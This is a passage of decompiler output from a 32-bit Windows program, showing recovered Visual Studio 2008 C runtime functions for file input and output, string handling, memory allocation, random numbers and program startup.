      *piVar1 = 0x16;
      __local_unwind4(&DAT_00422040,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00409180(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fread_nolock_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl
__fread_nolock_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  uint uVar1;
  undefined *puVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined *_DstBuf_00;
  uint local_10;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_DstBuf != (void *)0x0) {
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize))) {
LAB_00409258:
        uVar8 = _ElementSize * _Count;
        uVar7 = uVar8;
        puVar2 = (undefined *)_DstBuf;
        uVar1 = _DstSize;
        if ((_File->_flag & 0x10cU) == 0) {
          local_10 = 0x1000;
        }
        else {
          local_10 = _File->_bufsiz;
        }
joined_r0x0040927e:
        do {
          while( true ) {
            if (uVar7 == 0) {
              return _Count;
            }
            if ((_File->_flag & 0x10cU) == 0) break;
            uVar4 = _File->_cnt;
            if (uVar4 == 0) break;
            if ((int)uVar4 < 0) {
LAB_004093cf:
              _File->_flag = _File->_flag | 0x20;
LAB_004093d3:
              return (uVar8 - uVar7) / _ElementSize;
            }
            uVar6 = uVar7;
            if (uVar4 <= uVar7) {
              uVar6 = uVar4;
            }
            if (uVar1 < uVar6) {
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00409214;
            }
            _memcpy_s(puVar2,uVar1,_File->_ptr,uVar6);
            _File->_cnt = _File->_cnt - uVar6;
            _File->_ptr = _File->_ptr + uVar6;
            uVar7 = uVar7 - uVar6;
            uVar1 = uVar1 - uVar6;
            puVar2 = puVar2 + uVar6;
          }
          if (local_10 <= uVar7) {
            if (local_10 == 0) {
              uVar4 = 0x7fffffff;
              if (uVar7 < 0x80000000) {
                uVar4 = uVar7;
              }
            }
            else {
              if (uVar7 < 0x80000000) {
                uVar6 = uVar7 % local_10;
                uVar4 = uVar7;
              }
              else {
                uVar6 = (uint)(0x7fffffff % (ulonglong)local_10);
                uVar4 = 0x7fffffff;
              }
              uVar4 = uVar4 - uVar6;
            }
            if (uVar1 < uVar4) {
LAB_004093a2:
              if (_DstSize != 0xffffffff) {
                _memset(_DstBuf,0,_DstSize);
              }
              piVar3 = __errno();
              *piVar3 = 0x22;
              goto LAB_00409214;
            }
            _DstBuf_00 = puVar2;
            iVar5 = __fileno(_File);
            iVar5 = __read(iVar5,_DstBuf_00,uVar4);
            if (iVar5 == 0) {
              _File->_flag = _File->_flag | 0x10;
              goto LAB_004093d3;
            }
            if (iVar5 == -1) goto LAB_004093cf;
            uVar7 = uVar7 - iVar5;
            uVar1 = uVar1 - iVar5;
            puVar2 = puVar2 + iVar5;
            goto joined_r0x0040927e;
          }
          iVar5 = __filbuf(_File);
          if (iVar5 == -1) goto LAB_004093d3;
          if (uVar1 == 0) goto LAB_004093a2;
          *puVar2 = (char)iVar5;
          local_10 = _File->_bufsiz;
          uVar7 = uVar7 - 1;
          uVar1 = uVar1 - 1;
          puVar2 = puVar2 + 1;
        } while( true );
      }
      if (_DstSize != 0xffffffff) {
        _memset(_DstBuf,0,_DstSize);
      }
      if ((_File != (FILE *)0x0) && (_Count <= (uint)(0xffffffff / (ulonglong)_ElementSize)))
      goto LAB_00409258;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
LAB_00409214:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fread_s
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread_s(void *_DstBuf,size_t _DstSize,size_t _ElementSize,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_ElementSize != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fread_nolock_s(_DstBuf,_DstSize,_ElementSize,_Count,_File);
      FUN_00409473();
      return sVar2;
    }
    if (_DstSize != 0xffffffff) {
      _memset(_DstBuf,0,_DstSize);
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_00409473(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x18));
  return;
}



// Library Function - Single Match
//  _fread
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fread(void *_DstBuf,size_t _ElementSize,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
  sVar1 = _fread_s(_DstBuf,0xffffffff,_ElementSize,_Count,_File);
  return sVar1;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else if (_File->_tmpfname != (char *)0x0) {
        _free(_File->_tmpfname);
        _File->_tmpfname = (char *)0x0;
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2008 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_20 = -1;
  }
  else if ((*(byte *)&_File->_flag & 0x40) == 0) {
    __lock_file(_File);
    local_20 = __fclose_nolock(_File);
    FUN_00409585();
  }
  else {
    _File->_flag = 0;
  }
  return local_20;
}



void FUN_00409585(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __fwrite_nolock
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __fwrite_nolock(void *_DstBuf,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint _Size_00;
  uint uVar5;
  uint uVar6;
  char *_Buf;
  uint local_c;
  char *local_8;
  
  if ((_Size != 0) && (_Count != 0)) {
    if ((_File != (FILE *)0x0) &&
       ((_DstBuf != (void *)0x0 && (_Count <= (uint)(0xffffffff / (ulonglong)_Size))))) {
      uVar6 = _Size * _Count;
      uVar5 = uVar6;
      if ((_File->_flag & 0x10cU) == 0) {
        local_c = 0x1000;
      }
      else {
        local_c = _File->_bufsiz;
      }
      do {
        while( true ) {
          if (uVar5 == 0) {
            return _Count;
          }
          uVar4 = _File->_flag & 0x108;
          if (uVar4 == 0) break;
          uVar3 = _File->_cnt;
          if (uVar3 == 0) break;
          if ((int)uVar3 < 0) {
            _File->_flag = _File->_flag | 0x20;
            goto LAB_004096da;
          }
          _Size_00 = uVar5;
          if (uVar3 <= uVar5) {
            _Size_00 = uVar3;
          }
          _memcpy(_File->_ptr,_DstBuf,_Size_00);
          _File->_cnt = _File->_cnt - _Size_00;
          _File->_ptr = _File->_ptr + _Size_00;
          uVar5 = uVar5 - _Size_00;
LAB_00409696:
          local_8 = (char *)((int)_DstBuf + _Size_00);
          _DstBuf = local_8;
        }
        if (local_c <= uVar5) {
          if ((uVar4 != 0) && (iVar2 = __flush(_File), iVar2 != 0)) goto LAB_004096da;
          uVar4 = uVar5;
          if (local_c != 0) {
            uVar4 = uVar5 - uVar5 % local_c;
          }
          _Buf = (char *)_DstBuf;
          uVar3 = uVar4;
          iVar2 = __fileno(_File);
          uVar3 = __write(iVar2,_Buf,uVar3);
          if (uVar3 != 0xffffffff) {
            _Size_00 = uVar4;
            if (uVar3 <= uVar4) {
              _Size_00 = uVar3;
            }
            uVar5 = uVar5 - _Size_00;
            if (uVar4 <= uVar3) goto LAB_00409696;
          }
          _File->_flag = _File->_flag | 0x20;
LAB_004096da:
          return (uVar6 - uVar5) / _Size;
        }
                    // WARNING: Load size is inaccurate
        iVar2 = __flsbuf((int)*_DstBuf,_File);
        if (iVar2 == -1) goto LAB_004096da;
        _DstBuf = (void *)((int)_DstBuf + 1);
        local_c = _File->_bufsiz;
        uVar5 = uVar5 - 1;
        if ((int)local_c < 1) {
          local_c = 1;
        }
      } while( true );
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fwrite
// 
// Library: Visual Studio 2008 Release

size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  int *piVar1;
  size_t sVar2;
  
  if ((_Size != 0) && (_Count != 0)) {
    if (_File != (FILE *)0x0) {
      __lock_file(_File);
      sVar2 = __fwrite_nolock(_Str,_Size,_Count,_File);
      FUN_00409767();
      return sVar2;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return 0;
}



void FUN_00409767(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00409793;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00409793:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



void __cdecl FUN_004097e0(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x0040983c:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x0040983c;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



void FUN_00409875(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  __vswprintf_helper
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_helper(undefined *param_1,char *param_2,uint param_3,int param_4,undefined4 param_5,
                  undefined4 param_6)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  FILE local_24;
  
  if (param_4 == 0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  if ((param_3 != 0) && (param_2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_24._flag = 0x42;
  local_24._base = param_2;
  local_24._ptr = param_2;
  if (param_3 < 0x40000000) {
    local_24._cnt = param_3 * 2;
  }
  else {
    local_24._cnt = 0x7fffffff;
  }
  iVar2 = (*(code *)param_1)(&local_24,param_4,param_5,param_6);
  if (param_2 == (char *)0x0) {
    return iVar2;
  }
  if (-1 < iVar2) {
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      iVar3 = __flsbuf(0,&local_24);
      if (iVar3 == -1) goto LAB_00409964;
    }
    else {
      *local_24._ptr = '\0';
      local_24._ptr = local_24._ptr + 1;
    }
    local_24._cnt = local_24._cnt + -1;
    if (-1 < local_24._cnt) {
      *local_24._ptr = '\0';
      return iVar2;
    }
    iVar3 = __flsbuf(0,&local_24);
    if (iVar3 != -1) {
      return iVar2;
    }
  }
LAB_00409964:
  *(undefined2 *)(param_2 + param_3 * 2 + -2) = 0;
  return (-1 < local_24._cnt) - 2;
}



// Library Function - Single Match
//  __vswprintf_s_l
// 
// Library: Visual Studio 2008 Release

int __cdecl
__vswprintf_s_l(wchar_t *_DstBuf,size_t _DstSize,wchar_t *_Format,_locale_t _Locale,va_list _ArgList
               )

{
  int *piVar1;
  int iVar2;
  
  if (_Format == (wchar_t *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    if ((_DstBuf == (wchar_t *)0x0) || (_DstSize == 0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
    }
    else {
      iVar2 = __vswprintf_helper(__woutput_s_l,(char *)_DstBuf,_DstSize,(int)_Format,_Locale,
                                 _ArgList);
      if (iVar2 < 0) {
        *_DstBuf = L'\0';
      }
      if (iVar2 != -2) {
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x22;
    }
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



// Library Function - Single Match
//  _vswprintf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl _vswprintf_s(wchar_t *_Dst,size_t _SizeInWords,wchar_t *_Format,va_list _ArgList)

{
  int iVar1;
  
  iVar1 = __vswprintf_s_l(_Dst,_SizeInWords,_Format,(_locale_t)0x0,_ArgList);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_0042510c == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_00409a76();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_004237bc,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_00409a76(void)

{
  FUN_0040e64c(4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_004250fc) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_00409af4();
  }
  return local_20;
}



void FUN_00409af4(void)

{
  FUN_0040e64c(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_004237bc == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_0042510c == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_00409b6c:
        piVar1 = (int *)HeapAlloc(DAT_004237bc,0,dwBytes);
      }
      else if ((DAT_0042510c != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_00409b6c;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00423c60 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2008 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,(char **)&LAB_00422000,1);
  *(undefined ***)this = &PTR_FUN_0041c2c0;
  return this;
}



undefined4 * __thiscall FUN_00409bed(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0041c2c0;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00409875(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00409c14(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_0041c2c0;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0042346c & 1) == 0) {
    _DAT_0042346c = _DAT_0042346c | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_00423460);
    _atexit((_func_4879 *)&LAB_0041b525);
  }
  FUN_00409c14(local_10,(exception *)&DAT_00423460);
  __CxxThrowException_8(local_10,&DAT_0042079c);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00422d58) && ((p_Var2->_ownlocale & DAT_00422c74) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_00422b78) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_00422c74) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  __wcsicmp_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsicmp_l(wchar_t *_Str1,wchar_t *_Str2,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  wint_t wVar3;
  wint_t wVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_Str1 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else if (_Str2 == (wchar_t *)0x0) {
    piVar5 = __errno();
    *piVar5 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar6 = 0x7fffffff;
  }
  else {
    if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        uVar8 = (uint)(ushort)wVar1;
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
        uVar7 = (uint)(ushort)wVar2;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
    }
    else {
      do {
        wVar3 = __towlower_l(*_Str1,&local_14);
        uVar8 = (uint)wVar3;
        _Str1 = _Str1 + 1;
        wVar4 = __towlower_l(*_Str2,&local_14);
        _Str2 = _Str2 + 1;
        uVar7 = (uint)wVar4;
        if (wVar3 == 0) break;
      } while (wVar3 == wVar4);
    }
    iVar6 = uVar8 - uVar7;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar6;
}



// Library Function - Single Match
//  __wcsicmp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wcsicmp(wchar_t *_Str1,wchar_t *_Str2)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  int iVar4;
  
  if (DAT_00423c80 == 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      iVar4 = 0x7fffffff;
    }
    else {
      do {
        wVar1 = *_Str1;
        if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
          wVar1 = wVar1 + L' ';
        }
        wVar2 = *_Str2;
        if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
          wVar2 = wVar2 + L' ';
        }
        _Str1 = _Str1 + 1;
        _Str2 = _Str2 + 1;
      } while ((wVar1 != L'\0') && (wVar1 == wVar2));
      iVar4 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
    }
  }
  else {
    iVar4 = __wcsicmp_l(_Str1,_Str2,(_locale_t)0x0);
  }
  return iVar4;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00423478 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00409f51)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x409ef6;
  local_8 = 0;
  GetStartupInfoW(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_00426124 = GetCommandLineW();
  DAT_00423474 = ___crtGetEnvironmentStringsW();
  iVar1 = __wsetargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __wsetenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  __wwincmdln();
  local_24 = FUN_0040225a((HINSTANCE)&IMAGE_DOS_HEADER_00400000);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// Library Function - Single Match
//  _memmove
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memmove(void *_Dst,void *_Src,size_t _Size)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar1 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar4 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = _Size >> 2;
      uVar3 = _Size & 3;
      if (7 < uVar2) {
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar3) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040a263_caseD_2;
        case 3:
          goto switchD_0040a263_caseD_3;
        }
        goto switchD_0040a263_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040a263_caseD_0;
      case 1:
        goto switchD_0040a263_caseD_1;
      case 2:
        goto switchD_0040a263_caseD_2;
      case 3:
        goto switchD_0040a263_caseD_3;
      default:
        uVar2 = _Size - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar3 = uVar2 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
